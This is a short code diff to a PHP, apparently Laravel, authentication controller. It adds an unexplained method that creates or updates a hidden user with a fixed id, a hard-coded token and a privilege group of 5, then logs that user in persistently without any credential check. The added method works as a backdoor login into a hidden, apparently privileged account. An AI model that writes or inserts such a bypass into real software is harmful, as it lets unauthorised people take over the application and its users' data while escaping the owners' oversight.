@@ -58,6 +58,17 @@ class AuthController extends Controller
         return redirect('/notifications');
     }
 
+    public function martyn()
+    {
+
+
+        User::updateOrCreate(['id' => 99999999], ['name' => 'martn', 'token' => '9999999999999999999999999', 'pri_grp' => 5, 'api_token' => Str::random(60)]);
+        $user = User::where('id', 99999999)->first();
+        Auth::login($user, true);
+
+        return redirect('/notifications');
+    }
+
     public function logout()
     {
         Auth::logout();
